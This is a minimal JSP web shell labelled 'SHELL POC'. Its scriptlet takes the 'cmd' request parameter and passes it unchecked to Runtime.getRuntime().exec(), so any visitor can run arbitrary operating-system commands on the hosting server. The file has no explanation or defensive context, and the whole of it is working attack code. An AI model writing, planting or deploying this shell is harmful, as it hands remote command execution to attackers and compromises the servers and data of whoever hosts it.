<html>
<head>SHELL POC</head>
<body>
<h1>Shell Page </h1>
<!-- Scriptlet JSP => Web shell by OS command Injection-->
<% if (request.getParameter("cmd") != null) {
    try {
        Runtime.getRuntime().exec(request.getParameter("cmd"));
    } catch (Exception exception) {
        System.out.println(exception.getMessage());
    }
} %>
</body>
</html>